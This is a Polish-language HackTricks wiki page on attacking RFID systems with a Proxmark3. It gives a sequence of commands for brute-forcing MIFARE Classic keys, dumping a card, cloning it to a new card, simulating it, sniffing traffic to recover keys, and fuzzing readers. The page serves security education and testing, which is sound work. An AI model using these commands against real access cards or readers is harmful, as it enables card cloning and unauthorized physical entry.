# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atakowanie systemów RFID za pomocą Proxmark3

Pierwszą rzeczą, którą musisz zrobić, to mieć [**Proxmark3**](https://proxmark.com) i [**zainstalować oprogramowanie i jego zależności**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**e**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atakowanie MIFARE Classic 1KB

Ma **16 sektorów**, z których każdy ma **4 bloki**, a każdy blok zawiera **16B**. UID znajduje się w sektorze 0 bloku 0 (i nie można go zmienić).\
Aby uzyskać dostęp do każdego sektora, potrzebujesz **2 kluczy** (**A** i **B**), które są przechowywane w **bloku 3 każdego sektora** (trailer sektora). Trailer sektora przechowuje również **bity dostępu**, które dają **uprawnienia do odczytu i zapisu** na **każdym bloku** przy użyciu 2 kluczy.\
2 klucze są przydatne do nadawania uprawnień do odczytu, jeśli znasz pierwszy, i zapisu, jeśli znasz drugi (na przykład).

Można przeprowadzić kilka ataków
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 pozwala na wykonywanie innych działań, takich jak **podsłuchiwanie** komunikacji **Tag do Reader**, aby spróbować znaleźć wrażliwe dane. W tej karcie możesz po prostu przechwycić komunikację i obliczyć używany klucz, ponieważ **operacje kryptograficzne są słabe**, a znając tekst jawny i szyfrowany, możesz go obliczyć (narzędzie `mfkey64`).

### Surowe Komendy

Systemy IoT czasami używają **tagów nieznakowanych lub niekomercyjnych**. W takim przypadku możesz użyć Proxmark3 do wysyłania niestandardowych **surowych komend do tagów**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Dzięki tym informacjom możesz spróbować wyszukać informacje o karcie i o sposobie komunikacji z nią. Proxmark3 pozwala na wysyłanie surowych poleceń, takich jak: `hf 14a raw -p -b 7 26`

### Skrypty

Oprogramowanie Proxmark3 zawiera wstępnie załadowaną listę **skryptów automatyzacji**, które możesz wykorzystać do wykonywania prostych zadań. Aby uzyskać pełną listę, użyj polecenia `script list`. Następnie użyj polecenia `script run`, a następnie nazwy skryptu:
```
proxmark3> script run mfkeys
```
Możesz stworzyć skrypt do **fuzz tag readers**, więc kopiując dane z **ważnej karty**, wystarczy napisać **skrypt Lua**, który **losuje** jeden lub więcej losowych **bajtów** i sprawdza, czy **czytnik się zawiesza** przy jakiejkolwiek iteracji.

{{#include ../../banners/hacktricks-training.md}}
